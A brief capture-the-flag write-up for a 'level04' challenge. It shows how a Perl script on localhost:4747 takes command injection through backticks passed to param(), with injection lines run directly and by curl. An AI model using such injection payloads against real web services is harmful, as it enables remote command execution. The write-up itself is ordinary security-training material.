# cat level04.pl

it's a Perl script doing something on localhost:4747


# little bit of ressearch

found out the param() function can expose some vulnerabilities in Perl
analyzing the script we can deduce that we can inject some code in the param() function :
``./level04.pl x='`getflag`'``
this doesn't do much as we are executing the script as level04


# checking for open ports

netstat -tulpn tells us we are listening on port 4747 so maybe we can inject some code through here


# curl

curl localhost:4747?x=\`getflag\` 
